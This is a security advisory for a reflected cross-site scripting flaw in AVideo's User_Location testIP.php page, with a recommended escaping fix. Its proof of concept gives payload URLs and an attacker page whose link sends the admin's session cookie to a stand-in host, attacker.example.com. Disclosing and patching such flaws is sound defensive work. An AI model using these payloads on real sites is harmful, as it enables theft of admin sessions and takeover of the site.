# [M] AVideo: Reflected XSS via Unescaped ip Parameter in User_Location testIP.php

## Summary
Severity: Medium
Advisory: GHSA-jqrj-chh6-8h78
CVE: CVE-2026-34739
CWE: CWE-79
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N (CVSS_V3)
Published: 2026-04-01
Source: https://github.com/advisories/GHSA-jqrj-chh6-8h78
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The User_Location plugin's `testIP.php` page reflects the `ip` request parameter directly into an HTML input element without applying `htmlspecialchars()` or any other output encoding. This allows an attacker to inject arbitrary HTML and JavaScript via a crafted URL. Although the page is restricted to admin users, AVideo's `SameSite=None` cookie configuration allows cross-origin exploitation, meaning an attacker can lure an admin to a malicious link that executes JavaScript in their authenticated session.

## Details

At `plugin/User_Location/testIP.php:16`, the `ip` parameter is read from the request without sanitization:

```php
$ip = $_REQUEST['ip'];
```

At line 34, the value is echoed directly into an HTML input element's `value` attribute:

```php
<input type="text" name="ip" id="ip" class="form-control" value="<?php echo $ip; ?>">
```

No `htmlspecialchars()` is applied, allowing an attacker to break out of the `value` attribute and inject arbitrary HTML/JavaScript.

While the page requires admin authentication to access, AVideo sets session cookies with `SameSite=None`. When an admin clicks a link from an external site (email, chat, another website), their session cookie is sent with the request, and the XSS payload executes in the context of their authenticated admin session.

## Proof of Concept

1. Craft a URL with a payload that breaks out of the input value attribute:

```
https://your-avideo-instance.com/plugin/User_Location/testIP.php?ip="><script>alert(document.cookie)</script>
```

2. URL-encoded version for embedding in links:

```
https://your-avideo-instance.com/plugin/User_Location/testIP.php?ip=%22%3E%3Cscript%3Ealert(document.cookie)%3C/script%3E
```

3. The resulting HTML rendered in the browser:

```html
<input type="text" name="ip" id="ip" class="form-control" value=""><script>alert(document.cookie)</script>">
```

4. To exploit via cross-origin link (leveraging SameSite=None), host the following on an attacker-controlled page:

```html
<!-- attacker-page.html -->
<html>
<body>
<p>Click here to check your IP geolocation:</p>
<a href="https://your-avideo-instance.com/plugin/User_Location/testIP.php?ip=%22%3E%3Cscript%3Edocument.location=%27https://attacker.example.com/steal?c=%27%2Bdocument.cookie%3C/script%3E">
  Check IP Location
</a>
</body>
</html>
```

5. When an admin clicks the link, their session cookie is sent (due to `SameSite=None`), and the JavaScript executes in their authenticated session.

## Impact

An attacker can execute arbitrary JavaScript in the context of an admin user's session by sending them a crafted link. Because AVideo uses `SameSite=None` for session cookies, the attack works from any external website. Successful exploitation allows the attacker to steal the admin session cookie, create new admin accounts, modify site configuration, upload malicious plugins, or perform any other admin action.

- **CWE-79**: Improper Neutralization of Input During Web Page Generation (Cross-site Scripting)
- **Severity**: Medium

## Recommended Fix

Apply `htmlspecialchars()` when outputting the `$ip` variable at `plugin/User_Location/testIP.php:34`:

```php
// plugin/User_Location/testIP.php:34
<input type="text" name="ip" id="ip" class="form-control" value="<?php echo htmlspecialchars($ip, ENT_QUOTES, 'UTF-8'); ?>">
```

---
*Found by [aisafe.io](https://aisafe.io)*

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-jqrj-chh6-8h78
- https://nvd.nist.gov/vuln/detail/CVE-2026-34739
- https://github.com/WWBN/AVideo/commit/31e6888e40be89cc2ab27d4cef449f6d8339ffb2
- https://github.com/WWBN/AVideo
